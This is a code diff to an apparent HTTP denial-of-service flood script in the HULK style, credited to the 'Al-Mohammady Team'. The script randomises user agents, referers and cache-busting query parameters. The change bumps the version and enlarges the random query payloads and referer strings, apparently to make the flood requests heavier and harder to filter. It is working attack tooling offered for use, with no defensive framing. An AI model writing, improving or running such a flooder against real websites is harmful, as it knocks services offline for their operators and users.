@@ -19,7 +19,7 @@ headers_referers = []
 request_counter = 0
 flag = 0
 safe = 0
-__version__ = '8.0'
+__version__ = '8.7'
 __author__ = "Al-Mohammady Team."
 __method__ = 'HTTP'
 
@@ -75,14 +75,14 @@ def httpcall(url):
         param_joiner = "&"
     else:
         param_joiner = "?"
-    payload = buildblock(random.randint(0, 10)) + '=' + buildblock(random.randint(0,10))
+    payload = buildblock(random.randint(50,90)) + '=' + buildblock(random.randint(50,90))
     request_url = url + param_joiner + payload
     headers = {
         'User-Agent': random.choice(uagent),
         'Cache-Control': 'no-cache',
         'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-        'Referer': random.choice(referer_list()) + buildblock(random.randint(0, 10)),
+        'Referer': random.choice(referer_list()) + buildblock(random.randint(100,500)),
         'Keep-Alive': str(random.randint(120, 130)),
         'Connection': 'keep-alive',
         'Host': host,
